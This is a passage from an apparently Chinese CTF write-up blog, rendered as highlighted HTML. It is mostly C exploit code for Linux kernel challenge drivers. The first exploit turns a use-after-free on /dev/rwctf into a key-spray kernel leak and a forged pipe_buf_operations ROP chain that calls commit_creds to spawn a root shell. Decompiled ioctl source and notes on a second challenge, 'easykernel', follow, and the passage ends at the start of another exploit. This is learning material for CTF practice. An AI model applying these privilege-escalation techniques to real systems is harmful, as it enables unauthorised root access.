class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> rw_fd;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> size, <span class="type">char</span>* ptr)</span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123; .idx = idx, .size = size, .ptr = ptr &#125;;</span><br><span class="line">        ioctl(rw_fd, <span class="number">0xDEADBEEF</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> idx)</span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">n</span> =</span> &#123; .idx = idx &#125;;</span><br><span class="line">        ioctl(rw_fd, <span class="number">0xC0DECAFE</span>, &amp;n);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">char</span> *description, <span class="type">char</span> *payload, <span class="type">size_t</span> plen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, plen,</span><br><span class="line">                   KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> keyid, <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span>&#123;</span><br><span class="line">    <span class="type">int</span> key_id[KEY_SPRAY_NUM], victim_key_idx = <span class="number">-1</span>, pipe_key_id;</span><br><span class="line">    <span class="type">size_t</span> kernel_offset, pipe_buffer_addr;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];;</span><br><span class="line">    <span class="type">char</span> desciption[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    rw_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(rw_fd &lt; <span class="number">0</span>) err_exit(<span class="string">&quot;open /dev/rwctf&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] construct UAF obj and spray keys...&quot;</span>);</span><br><span class="line">    add(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(desciption, <span class="number">0x100</span>, <span class="string">&quot;%s%d&quot;</span>, <span class="string">&quot;Qanux&quot;</span>, i);</span><br><span class="line">        key_id[i] = key_alloc(desciption, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);</span><br><span class="line">        <span class="keyword">if</span> (key_id[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d key!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;add_key()&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] corrupting user_key_payload...&quot;</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (KEY_SPRAY_NUM * <span class="number">2</span>); i++) &#123;</span><br><span class="line">        add(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak kernel base...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KEY_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key_read(key_id[i], buf, <span class="number">0x4000</span>) &gt; PIPE_INODE_INFO_SZ) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found victim key at idx: %d\n&quot;</span>, i);</span><br><span class="line">            victim_key_idx = i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            key_revoke(key_id[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_key_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;corrupt user_key_payload&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    binary_dump(<span class="string">&quot;user_key_payload data&quot;</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    kernel_offset = buf[<span class="number">22</span>] - USER_FREE_PAYLOAD_RCU;</span><br><span class="line">    hexx(<span class="string">&quot;Kernel offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset;</span><br><span class="line">    push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret += kernel_offset;</span><br><span class="line">    pop_rbx_pop_rbp_pop_r12_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    xchg_rdi_rax_dec_sth_ret += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;xchg_rdi_rax_dec_sth_ret&quot;</span>, xchg_rdi_rax_dec_sth_ret);</span><br><span class="line">    hexx(<span class="string">&quot;pop_rbx_pop_rbp_pop_r12_ret&quot;</span>, pop_rbx_pop_rbp_pop_r12_ret);</span><br><span class="line">    hexx(<span class="string">&quot;push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret&quot;</span>, push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] construct UAF on pipe_inode_info...&quot;</span>);</span><br><span class="line">    add(<span class="number">0</span>, PIPE_INODE_INFO_SZ, buf);  <span class="comment">// obj0</span></span><br><span class="line">    add(<span class="number">1</span>, PIPE_INODE_INFO_SZ, buf);  <span class="comment">// obj1</span></span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// freelist 192: obj0-&gt;obj1-&gt;...</span></span><br><span class="line"></span><br><span class="line">    pipe_key_id = key_alloc(<span class="string">&quot;Qanuxpipe&quot;</span>, buf, PIPE_INODE_INFO_SZ - <span class="number">0x18</span>);  <span class="comment">// user_key_payload: obj1</span></span><br><span class="line">    del(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// freelist 192: obj1-&gt;obj0-&gt;...</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, PIPE_BUFFER_SZ, buf); </span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// freelist 1024: obj2-&gt;...</span></span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);  <span class="comment">// pipe_inode_info: obj1;  user_key_payload-&gt;datalen = 0xffff</span></span><br><span class="line"></span><br><span class="line">    key_read(pipe_key_id, buf, <span class="number">0xffff</span>);</span><br><span class="line">    pipe_buffer_addr = buf[<span class="number">16</span>];  <span class="comment">// pipe_inode_info-&gt;bufs</span></span><br><span class="line">    binary_dump(<span class="string">&quot;pipe_inode_info&quot;</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    hexx(<span class="string">&quot;pipe_buffer&quot;</span>, pipe_buffer_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] construct fake pipe_buf_operations...&quot;</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = pipe_buffer_addr + <span class="number">0x18</span>;  <span class="comment">// pipe_buffer-&gt;ops </span></span><br><span class="line">    <span class="comment">// after release(), we got back here </span></span><br><span class="line">    buf[<span class="number">3</span>] = pop_rbx_pop_rbp_pop_r12_ret;</span><br><span class="line">    <span class="comment">// pipe_buf_operations-&gt;release </span></span><br><span class="line">    buf[<span class="number">4</span>] = push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret;</span><br><span class="line">    buf[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">7</span>] = pop_rdi_ret;</span><br><span class="line">    buf[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">9</span>] = prepare_kernel_cred;</span><br><span class="line">    buf[<span class="number">10</span>] = xchg_rdi_rax_dec_sth_ret;</span><br><span class="line">    buf[<span class="number">11</span>] = commit_creds;</span><br><span class="line">    buf[<span class="number">12</span>] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x31</span>;</span><br><span class="line">    buf[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">    buf[<span class="number">15</span>] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">    buf[<span class="number">16</span>] = user_cs;</span><br><span class="line">    buf[<span class="number">17</span>] = user_rflags;</span><br><span class="line">    buf[<span class="number">18</span>] = user_sp + <span class="number">8</span>; </span><br><span class="line">    buf[<span class="number">19</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">    del(<span class="number">0</span>);</span><br><span class="line">    add(<span class="number">0</span>, PIPE_BUFFER_SZ, buf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] trigerring pipe_buf_operations-&gt;release()...&quot;</span>);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="西湖论剑2021-easykernel"><a href="#西湖论剑2021-easykernel" class="headerlink" title="西湖论剑2021 easykernel"></a>西湖论剑2021 easykernel</h2><h3 id="部分源码"><a href="#部分源码" class="headerlink" title="部分源码"></a>部分源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kerpwn_ioctl</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// r13</span></span><br><span class="line">  __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// r13</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp-48h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp-40h] [rbp-40h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp-38h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp-30h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(a1, a2);</span><br><span class="line">  v15 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x40</span> )                     <span class="comment">// read</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v12, v2, <span class="number">0x18</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(_QWORD *))show)(&amp;v12);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)a2 &gt; <span class="number">0x40</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 == <span class="number">0x50</span> )                   <span class="comment">// write</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( copy_from_user(&amp;v12, v2, <span class="number">0x18</span>LL) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v12 &lt;= <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = addrList[(<span class="type">unsigned</span> <span class="type">int</span>)v12];</span><br><span class="line">        <span class="keyword">if</span> ( v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v13;                             <span class="comment">// size</span></span><br><span class="line">          v6 = v14;                             <span class="comment">// buf</span></span><br><span class="line">          <span class="keyword">if</span> ( v13 &lt;= <span class="number">0x7FFFFFFF</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            _check_object_size(addrList[(<span class="type">unsigned</span> <span class="type">int</span>)v12], v13, <span class="number">0LL</span>);</span><br><span class="line">            copy_from_user(v4, v6, v5);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_29:</span><br><span class="line">          BUG();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)a2 != <span class="number">0x30</span> )                   <span class="comment">// delete</span></span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">if</span> ( !copy_from_user(&amp;v12, v2, <span class="number">8LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v12 &lt;= <span class="number">0x20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addrList[(<span class="type">unsigned</span> <span class="type">int</span>)v12] )</span><br><span class="line">          kfree();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;v12, v2, <span class="number">0x10</span>LL) )       <span class="comment">// 0x20 add</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt; <span class="number">0x20</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v7 = _kmalloc(v12, <span class="number">0xCC0</span>LL);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v9 = v12;                                     <span class="comment">// size</span></span><br><span class="line">  v10 = v13;                                    <span class="comment">// buf</span></span><br><span class="line">  <span class="keyword">if</span> ( v12 &gt; <span class="number">0x7FFFFFFF</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  _check_object_size(v7, v12, <span class="number">0LL</span>);</span><br><span class="line">  v11 = copy_from_user(v8, v10, v9);</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( addrList[v11] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v11 == <span class="number">0x20</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  addrList[(<span class="type">int</span>)v11] = v8;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>学了一段时间内核，发现这一道题是真的简单，瞬间秒了。明显的<code>UAF</code>漏洞，直接用<code>seq</code>泄露出内核地址，然后配合<code>rt_regs</code>栈迁移打内核<code>rop</code></p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 